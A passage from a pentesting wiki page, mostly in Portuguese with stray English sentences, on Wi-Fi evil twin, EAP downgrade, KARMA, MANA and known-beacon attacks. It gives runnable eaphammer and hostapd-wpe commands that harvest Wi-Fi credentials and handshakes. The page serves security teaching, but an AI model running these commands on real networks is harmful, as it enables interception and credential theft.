Please, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it).

_Por favor, note que por padrão, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo não vai conectar automaticamente a um Open evil Twin. Você pode tentar fazer DoS no AP real e esperar que o usuário conecte manualmente ao seu Open evil Twin, ou pode fazer DoS no AP real e usar um WPA Evil Twin para capturar o handshake (usando este método você não conseguirá permitir que a vítima conecte-se a você pois não conhece o PSK, mas pode capturar o handshake e tentar cracká-lo)._

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

Você pode criar um **Evil Twin using WPA/2** e se os dispositivos estiverem configurados para conectar a esse SSID com WPA/2, eles vão tentar conectar. De qualquer forma, **para completar o 4-way-handshake** você também precisa **saber** a **senha** que o cliente vai usar. Se você **não souber** ela, a **conexão não será completada**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender esses ataques, recomendo ler primeiro a breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um arquivo **configuração** para funcionar. Para **automatizar** a geração dessas configurações você pode usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (baixe o arquivo python dentro de _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configuração você pode selecionar muitas coisas diferentes como ssid, channel, user files, cret/key, dh parameters, wpa version e auth...

[**Usando hostapd-wpe com EAP-TLS para permitir que qualquer certificado faça login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padrão, o EAPHammer utiliza estes métodos de autenticação (observe GTC como o primeiro a tentar obter senhas em texto simples e, em seguida, métodos de autenticação mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta é a metodologia padrão para evitar longos tempos de conexão. No entanto, você também pode especificar ao servidor os métodos de autenticação do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou você também pode usar:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` pode usar certificados previamente gerados para oferecer autenticação EAP a redes WPA/WPA2-Enterprise. A rede falsa irá rebaixar o protocolo de conexão para EAP-MD5 assim será capaz de **capturar o usuário e o MD5 da senha**. Mais tarde, o atacante pode tentar quebrar a senha.\
`Airggedon` oferece a possibilidade de um **Evil Twin contínuo (noisy)** ou **apenas criar o Evil Attack até alguém se conectar (smooth).**

![](<../../images/image (936).png>)

### Depuração de túneis TLS PEAP e EAP-TTLS em ataques Evil Twins

_Este método foi testado em uma conexão PEAP, mas como estou descriptografando um túnel TLS arbitrário isso também deve funcionar com EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comente** a linha que contém _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isso fará com que `hostapd-wpe` **troque chaves usando RSA** em vez de DH, assim você poderá **descriptografar** o tráfego depois **conhecendo a chave privada do servidor**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Adicione uma nova entrada e preencha o formulário com estes valores: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**selecione seu arquivo de chave**, para evitar problemas selecione um arquivo de chave **sem proteção por senha**).

![](<../../images/image (687).png>)

E veja a nova aba **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA e Known beacons attack

### ESSID e listas negras/brancas de MAC

Diferentes tipos de Media Access Control Filter Lists (MFACLs) e seus modos correspondentes e efeitos no comportamento de um rogue Access Point (AP):

1. **MAC-based Whitelist**:
- O rogue AP responderá apenas a probe requests de dispositivos especificados na whitelist, permanecendo invisível para todos os outros não listados.
2. **MAC-based Blacklist**:
- O rogue AP ignorará probe requests de dispositivos na blacklist, tornando efetivamente o rogue AP invisível para esses dispositivos específicos.
3. **SSID-based Whitelist**:
- O rogue AP responderá a probe requests apenas para ESSIDs específicos listados, tornando-se invisível para dispositivos cujas Preferred Network Lists (PNLs) não contenham esses ESSIDs.
4. **SSID-based Blacklist**:
- O rogue AP não responderá a probe requests para os ESSIDs específicos na blacklist, tornando-se invisível para dispositivos que procuram por essas redes em particular.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite que um atacante crie um access point malicioso (AP) que responde a todas as probe requests de dispositivos que procuram conectar-se a redes. Essa técnica engana os dispositivos para que se conectem ao AP do atacante ao imitar as redes que os dispositivos estão procurando. Uma vez que um dispositivo envia um pedido de conexão para esse rogue AP, a conexão se completa, levando o dispositivo a conectar-se por engano à rede do atacante.

### MANA

Depois, os dispositivos começaram a ignorar respostas de rede não confiáveis, reduzindo a eficácia do ataque KARMA original. No entanto, um novo método, conhecido como MANA attack, foi introduzido por Ian de Villiers e Dominic White. Esse método envolve o rogue AP capturar as Preferred Network Lists (PNL) dos dispositivos ao responder às suas broadcast probe requests com nomes de rede (SSIDs) previamente registrados pelos dispositivos. Esse ataque sofisticado contorna as proteções contra o ataque KARMA original ao explorar a forma como os dispositivos lembram e priorizam redes conhecidas.

O ataque MANA opera monitorando tanto directed como broadcast probe requests dos dispositivos. Para directed requests, ele registra o MAC address do dispositivo e o nome da rede solicitado, adicionando essa informação a uma lista. Quando uma broadcast request é recebida, o AP responde com informações que correspondem a qualquer uma das redes na lista do dispositivo, incentivando o dispositivo a conectar-se ao rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Um **Loud MANA attack** é uma estratégia avançada para quando dispositivos não usam directed probing ou quando suas Listas de Redes Preferidas (PNL) são desconhecidas pelo atacante. Opera com o princípio de que **dispositivos na mesma área provavelmente compartilham alguns nomes de rede em suas PNLs**. Em vez de responder seletivamente, este ataque transmite probe responses para cada nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede familiar e tentar conectar-se ao rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando o **Loud MANA attack** pode não ser suficiente, o **Known Beacon attack** apresenta outra abordagem. Este método **brute-forces o processo de conexão simulando um AP que responde a qualquer nome de rede, percorrendo uma lista de ESSIDs potenciais** derivada de um wordlist. Isso simula a presença de numerosas redes, na esperança de coincidir com um ESSID na PNL da vítima, provocando uma tentativa de conexão ao AP fabricado. O ataque pode ser ampliado combinando-o com a opção `--loud` para uma tentativa mais agressiva de capturar dispositivos.

Eaphammer implementou esse ataque como um MANA attack onde todos os ESSIDs dentro de uma lista são anunciados (você também poderia combinar isso com `--loud` para criar um Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

O **Known Beacon Burst attack** envolve a **transmissão em alta velocidade de beacon frames para cada ESSID listada em um arquivo**. Isso cria um ambiente denso de redes falsas, aumentando muito a probabilidade de dispositivos se conectarem ao rogue AP, especialmente quando combinado com um MANA attack. Essa técnica aproveita velocidade e volume para sobrecarregar os mecanismos de seleção de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** é um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi‑Fi, sem a necessidade de um ponto de acesso sem fio tradicional. Essa capacidade está integrada em vários dispositivos de Internet of Things (IoT), como impressoras e televisores, facilitando a comunicação direta dispositivo-a-dispositivo. Uma característica notável do Wi‑Fi Direct é que um dispositivo assume o papel de access point, conhecido como group owner, para gerenciar a conexão.

Security for Wi‑Fi Direct connections is established through **Wi‑Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Esses métodos, particularmente PIN entry, são suscetíveis às mesmas vulnerabilidades do WPS em redes Wi‑Fi tradicionais, tornando-os alvos para vetores de ataque semelhantes.

### EvilDirect Hijacking

**EvilDirect Hijacking** é um ataque específico ao Wi‑Fi Direct. Ele espelha o conceito de um ataque Evil Twin, mas mira conexões Wi‑Fi Direct. Nesse cenário, um atacante se faz passar por um group owner legítimo com o objetivo de enganar dispositivos para que se conectem a uma entidade maliciosa. Esse método pode ser executado usando ferramentas como `airbase-ng`, especificando o channel, ESSID e MAC address do dispositivo impersonado:

## Referências

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Dê uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com Facebook e imitação de WPA em captive portals)

{{#include ../../banners/hacktricks-training.md}}
